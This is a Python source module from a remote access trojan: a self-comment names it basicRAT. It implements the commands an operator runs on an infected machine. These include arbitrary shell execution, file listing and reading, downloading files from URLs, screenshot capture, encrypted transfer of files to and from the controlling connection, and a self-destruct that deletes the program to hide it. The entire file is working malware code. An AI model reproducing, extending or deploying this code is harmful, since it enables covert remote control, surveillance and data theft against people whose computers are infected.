# toolkit module

import datetime
import os
import subprocess
import sys
import urllib
import zipfile
import gtk
from core import crypto


def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(4000)
        except IOError:
            return 'Error: Permission denied.'
    else:
        return 'Error: File not found.'


def execute(command):
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def ls(path):
    if not path:
        path = '.'

    if os.path.exists(path):
        try:
            return '\n'.join(os.listdir(path))
        except OSError:
            return 'Error: Permission denied.'
    else:
        return 'Error: Path not found.'


def pwd():
    return os.getcwd()


def selfdestruct():
    # self delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)


def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)


def screenshot():
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB, False, 8, sz[0], sz[1])
    pb = pb.get_from_drawable(w, w.get_colormap(), 0, 0, 0, 0, sz[0], sz[1])

    if (pb != None):
        pb.save("screenshot.png", "png")
        try:
            with open("screenshot.png") as f:
                return f.read(100000000)
        except IOError:
            return 'Error: Permission denied.'
    else:
        return "Unable to get the screenshot."


def recvfile(conn, dhkey):
    fname = crypto.decrypt(conn.recv(1024), dhkey)
    str = "@client"
    nname = str + fname
    data = crypto.decrypt(conn.recv(4096), dhkey)
    if len(data) != 0:
        rfile = open(nname, 'w')
        rfile.write(data)
    return 'File {} uploaded.'.format("ok")


def sendfile(conn, dhkey):
    print "download"
    path = crypto.decrypt(conn.recv(1024), dhkey)
    try:
        with open(path, 'r') as f:
            data =  f.read(os.path.getsize(path))
        conn.send(crypto.encrypt(data, dhkey))
    except IOError:
        return 'Error: Permission denied.'
